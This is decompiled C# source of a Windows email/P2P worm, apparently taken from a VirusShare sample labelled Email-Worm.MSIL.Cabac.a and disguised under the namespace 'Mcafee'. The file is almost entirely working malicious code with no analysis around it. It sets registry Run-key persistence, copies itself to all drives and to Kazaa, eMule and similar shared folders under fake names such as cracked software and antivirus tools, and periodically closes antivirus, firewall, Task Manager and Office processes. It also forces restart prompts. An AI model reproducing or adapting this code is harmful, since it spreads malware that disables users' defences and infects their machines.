﻿// Decompiled with JetBrains decompiler
// Type: Mcafee.Form1
// Assembly: Mcafee, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E8ABDF02-8A4A-421D-8941-056F8CA96A8B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Email-Worm.MSIL.Cabac.a-6a616d6396ea98af23899d1ef241f1987c0c048c5ff5c3600a97133b5e844b01.exe

using Api;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Mcafee
{
  public class Form1 : Form
  {
    private IContainer components;
    private Timer mailer;
    private Timer killer;
    private Timer coppy;
    private Timer eerrorr;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.mailer = new Timer(this.components);
      this.killer = new Timer(this.components);
      this.coppy = new Timer(this.components);
      this.eerrorr = new Timer(this.components);
      this.SuspendLayout();
      this.mailer.Enabled = true;
      this.mailer.Interval = 50000;
      this.mailer.Tick += new EventHandler(this.mailer_Tick);
      this.killer.Enabled = true;
      this.killer.Interval = 150;
      this.killer.Tick += new EventHandler(this.killer_Tick);
      this.coppy.Enabled = true;
      this.coppy.Interval = 720000;
      this.coppy.Tick += new EventHandler(this.coppy_Tick);
      this.eerrorr.Enabled = true;
      this.eerrorr.Interval = 90000;
      this.eerrorr.Tick += new EventHandler(this.eerrorr_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 266);
      this.Name = nameof (Form1);
      this.Text = "AmirCivil";
      this.Activated += new EventHandler(this.amir22);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
    }

    private void mailer_Tick(object sender, EventArgs e) => new Form2().Show();

    private void killer_Tick(object sender, EventArgs e)
    {
      try
      {
        string[] strArray = new string[57]
        {
          "NPROTECTED",
          "GhostTray",
          "NAVW32",
          "F-AGNT95",
          "NOD32",
          "NETD32",
          "NETMON",
          "IOMON98",
          "SCAN32",
          "NORMIST",
          "NAVW3",
          "ADAWARE",
          "AGENTW",
          "LU32",
          "NAVAP32",
          "ANTIVIR",
          "TCM",
          "W9X",
          "AVKSERV",
          "AV32",
          "ACKWIN32",
          "AD-AWARE",
          "ADVXDWIN",
          "AGENTSVR",
          "AGENTW",
          "ANTIVIRUS",
          "ANTS",
          "APIMONITOR",
          "APLICA32",
          "ARR",
          "AUPDATE",
          "AUTODOWN",
          "AUTOTRACE",
          "AVE32",
          "AVGCC32",
          "AVGCTRL",
          "AVGNT",
          "CFINET",
          "CLEANPC",
          "CTRL",
          "AV32",
          "DATEMANAGER ",
          "DOORS",
          "DPFSETUP ",
          "FCH32 ",
          "FNRB32",
          "notepad",
          "Babylon",
          "POP3TRAP",
          "WINWORD",
          "realplay",
          "EXCEL",
          "taskmgr",
          "regedit",
          "vb6",
          "ZONEALARM",
          "POWERPNT"
        };
        foreach (Process process in Process.GetProcessesByName(strArray[new Random().Next(0, 57)]))
          process.CloseMainWindow();
      }
      catch (Exception ex)
      {
      }
    }

    private void coppy_Tick(object sender, EventArgs e)
    {
      try
      {
        string str = new string[10]
        {
          "\\Services.pif",
          "\\winamp.exe",
          "\\mail.dll.exe",
          "\\vista.exe",
          "\\Norton.exe",
          "\\Mcafee.exe",
          "\\Nod32.cmd",
          "\\avg.pif",
          "\\AmirCivil.pif",
          "\\ScreenSaver.scr"
        }[new Random().Next(0, 10)];
        foreach (string logicalDrive in Directory.GetLogicalDrives())
          File.Copy(Application.ExecutablePath, logicalDrive + str);
      }
      catch (Exception ex)
      {
      }
    }

    private void amir22(object sender, EventArgs e)
    {
      this.Hide();
      try
      {
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\WinServicces.cab.bak.exe");
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SadNet3", (object) (Environment.SystemDirectory + "\\WinServicces.cab.bak.exe"), RegistryValueKind.ExpandString);
        Registry.SetValue("HKEY_CURRENT_USER\\SadNet3", "SadNet3", (object) "(_-oO]xX|-|S|-|a|-|d|-|N|-|e|-|t|-|Xx[Oo-_)!", RegistryValueKind.ExpandString);
      }
      catch (Exception ex)
      {
      }
      try
      {
        File.Copy(Application.ExecutablePath, "C:\\Program Files\\\\Kazaa\\My Shared Folder\\winampa.dll.pif");
        File.Copy(Application.ExecutablePath, "D:\\Program Files\\\\Kazaa\\My Shared Folder\\project.exe");
        File.Copy(Application.ExecutablePath, "J:\\Program Files\\\\Kazaa\\My Shared Folder\\SkyNetAntiVirus.doc.cmd");
        File.Copy(Application.ExecutablePath, "E:\\Program Files\\\\Kazaa\\My Shared Folder\\screen_saver!.scr");
        File.Copy(Application.ExecutablePath, "F:\\Program Files\\\\Kazaa\\My Shared Folder\\winlogon.dll.exe");
        File.Copy(Application.ExecutablePath, "H:\\Program Files\\\\Kazaa\\My Shared Folder\\fun.pic.scr");
        File.Copy(Application.ExecutablePath, "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
        File.Copy(Application.ExecutablePath, "C:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
        File.Copy(Application.ExecutablePath, "C:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
        File.Copy(Application.ExecutablePath, "C:\\Program Files\\eMule\\Incoming\\symantec.cmd");
        File.Copy(Application.ExecutablePath, "D:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
        File.Copy(Application.ExecutablePath, "D:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
        File.Copy(Application.ExecutablePath, "D:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
        File.Copy(Application.ExecutablePath, "D:\\Program Files\\eMule\\Incoming\\symantec.cmd");
        File.Copy(Application.ExecutablePath, "E:\\Program Files\\Kazaa\\My Shared Folder\\winampa2.dll.pif");
        File.Copy(Application.ExecutablePath, "E:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
        File.Copy(Application.ExecutablePath, "E:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
        File.Copy(Application.ExecutablePath, "E:\\Program Files\\eMule\\Incoming\\symantec.cmd");
        File.Copy(Application.ExecutablePath, "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
        File.Copy(Application.ExecutablePath, "D:\\Program Files\\Kazaa\\My Shared Folder\\project.exe");
        File.Copy(Application.ExecutablePath, "J:\\Program Files\\Kazaa\\My Shared Folder\\SkyNetAntiVirus.doc.cmd");
        File.Copy(Application.ExecutablePath, "E:\\Program Files\\Kazaa\\My Shared Folder\\screen_saver!.scr");
        File.Copy(Application.ExecutablePath, "F:\\Program Files\\Kazaa\\My Shared Folder\\winlogon.dll.exe");
        File.Copy(Application.ExecutablePath, "H:\\Program Files\\Kazaa\\My Shared Folder\\fun.pic.scr");
      }
      catch (Exception ex)
      {
      }
    }

    private void eerrorr_Tick(object sender, EventArgs e)
    {
      api.MessageBeep(20);
      api.SHRestartSystemMB(0, "Windows", 1);
    }
  }
}
